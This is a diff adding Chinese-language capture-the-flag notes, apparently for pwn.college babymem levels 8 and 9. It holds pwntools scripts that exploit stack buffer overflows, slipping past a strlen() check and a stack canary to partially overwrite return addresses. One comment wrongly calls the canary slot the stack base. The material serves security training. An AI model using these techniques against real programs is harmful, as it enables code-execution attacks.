@@ -616,7 +616,112 @@ while True:
 
 ## level 8
 
+此关跟上level 7一致，多了一句strlen()判断字符串长度，我们直接将填充字节换成00这样，strlen的返回长度就是0。
 
+```python
+from pwn import *
+context.arch = "amd64"
+elf = ELF("/challenge/babymem_level8.0")
+p = process("/challenge/babymem_level8.0")
+p.sendline("74")
+
+buffer_size = 72
+payload = buffer_size * b'\x00' + b'\x95\x19'
+p.sendline(payload)
+p.interactive()
+```
 
 ## level 9
 
+这道题开启了栈保护，但我们能控制缓冲区溢出时写入的位置，只要我们跳过栈保护的随机值，直接覆盖返回地址，就不会出发栈保护。
+
+
+
+```asm
+.text:0000000000002684 B8 00 00 00 00                mov     eax, 0
+.text:0000000000002689 48 8B 4D F8                   mov     rcx, [rbp+var_8] # var_8存储的是栈基址
+.text:000000000000268D 64 48 33 0C 25 28 00 00 00    xor     rcx, fs:28h
+.text:0000000000002696 74 05                         jz      short locret_269D
+.text:0000000000002696
+.text:0000000000002698 E8 C3 EA FF FF                call    ___stack_chk_fail
+
+buffsize
+00 00 00 00 n 00 00 00
+变量1
+金丝雀随机值
+rbp
+return返回地址
+
+```
+
+有一个需要注意的问题，就是发送的字节数。因为在循环的结束是小于之前输入的`v4`，所以你必须确保在覆盖掉返回地址的两个字节后，循环就要终止。所以向程序发送的`v4`，是` buffer 距离 return 的字节数 + 2`
+
+```python
+printf("Send your payload (up to %lu bytes)!\n", v4);
+while ( *v6 < v4 )
+{
+    v0 = read(0, (char *)v5 + *v6, 1uLL);
+    *v6 += v0;
+}
+```
+
+
+```python
+
+from pwn import *
+
+elf = ELF("/challenge/babymem_level9.1")
+
+while True:
+    p = process("/challenge/babymem_level9.1")
+    p.sendline("58")
+    output = p.recvuntil("Send your payload (up to 58 bytes)!").decode("utf-8")
+
+    i = 0 
+    while i < (24 + 1) + 2: # 24 为buffer_size  2是覆盖的返回值字节数, 1是n变量
+        print(f"send {i}th bytes")
+
+        if i == 24:
+            p.send(b'\x37')
+        elif i == 26:
+            p.send(b'\x1A')
+        elif i == 25:
+            p.send(b'\x76')
+        else:
+            p.send(b'\xBB')
+
+        i += 1
+    
+    output = p.recvall().decode("utf-8")
+    if "pwn" in output:
+        print(output)
+        exit()
+
+
+elf = ELF("/challenge/babymem_level9.0")
+while True:
+    p = process("/challenge/babymem_level9.0")
+    p.sendline("90")
+    output = p.recvuntil("Send your payload (up to 90 bytes)!").decode("utf-8")
+    print(output)
+
+    i = 0 
+    while i < 64  + 4 + 2 + 1: # 64 为buffer_size , 4是n变量前面的空字节数, 2是覆盖的返回值字节数, 1是n变量
+        if i == 64 + 4:
+            p.send(b'\x57')
+        elif i == 70:
+            p.send(b'\x1c')
+        elif i == 69:
+            p.send(b'\x62')
+        else:
+            p.send(b'\xBB')
+        i += 1
+
+    p.interactive()
+    output = p.recvall().decode("utf-8")
+    if "pwn" in output:
+        print(output)
+        exit()
+```
+
+# level 10
